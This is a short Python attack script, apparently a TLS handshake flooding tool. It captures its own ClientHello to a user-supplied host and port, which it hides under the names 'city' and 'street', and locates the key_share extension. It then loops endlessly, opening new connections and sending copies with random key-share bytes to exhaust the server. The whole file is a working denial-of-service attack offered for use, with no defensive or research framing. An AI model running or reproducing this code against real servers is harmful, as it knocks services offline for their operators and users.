from scapy.all import sniff
import socket
import ssl
import threading
import time
import os

city = None
street = None
packet = []
sniff_started = threading.Event()
parsed_data = {
        "full_payload": None,
        "extensions_start": None,
        "extensions_end": None,
        "key_share_start": None,
        "key_share_end": None
}

def set():
    global city, street
    my_input = input("Tell Me\n")
    city, street = my_input.split(":")

def capture_pkt():
    global city, street, packet
    sniff_started.set()
    packet = sniff(
        filter=f"tcp and dst host {city} and dst port {street}",
        count=3,
        store=1
        )[2]

def make_tls():
    global city, street
    sniff_started.wait()
    tcp_socket = socket.create_connection((city, street))
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False
    tls_socket = ssl_context.wrap_socket(tcp_socket, server_hostname=city)
    tls_socket.close()
    tcp_socket.close()

def analyze_pkt():
    global packet, parsed_data
    if packet.haslayer('TCP'):
        ip_layer = packet['IP']
        tcp_layer = packet['TCP']
        if tcp_layer.payload:
            payload = bytes(tcp_layer.payload)
            parsed_data["full_payload"] = payload.hex()
            if payload[:3] == b'\x16\x03\x01':
                try:
                    session_id_length = payload[43]
                    cipher_suites_length = int.from_bytes(payload[44 + session_id_length:46 + session_id_length], 'big')
                    compression_methods_length = payload[46 + session_id_length + cipher_suites_length]
                    extensions_start = 47 + session_id_length + cipher_suites_length + compression_methods_length
                    extensions_length = int.from_bytes(payload[extensions_start:extensions_start + 2], 'big')
                    extensions_end = extensions_start + 2 + extensions_length
                    parsed_data["extensions_start"] = extensions_start
                    parsed_data["extensions_end"] = extensions_end
                    extensions_data = payload[extensions_start:extensions_end]
                    key_share_relative_position = extensions_data.find(b'\x00\x33')  # Key Share Extension Type
                    if key_share_relative_position != -1:
                        key_share_start = extensions_start + key_share_relative_position
                        key_share_length = int.from_bytes(extensions_data[key_share_relative_position + 2:key_share_relative_position + 4], 'big')
                        key_share_end = key_share_start + 4 + key_share_length
                        parsed_data["key_share_start"] = key_share_start
                        parsed_data["key_share_end"] = key_share_end
                except IndexError:
                    pass

def faking():
    global city, street, parsed_data
    if parsed_data:
        full = bytes.fromhex(parsed_data["full_payload"])
        start = parsed_data['key_share_start'] + 10
        end = parsed_data['key_share_end']
        if not (0 <= start < end <= len(full)):
            raise ValueError("잘못된 start 또는 end 값입니다.")
    while True:
        random_bytes = os.urandom(end - start)
        faked = full[:start] + random_bytes + full[end:]
        tcp_sock = socket.create_connection((city, street))
        tcp_sock.sendall(faked)
        tcp_sock.shutdown(socket.SHUT_RDWR)
        tcp_sock.close()

if __name__ == "__main__":
    set()
    capturing = threading.Thread(target=capture_pkt)
    capturing.start()
    time.sleep(0.5)
    make_tls()
    capturing.join()
    analyze_pkt()
    faking()
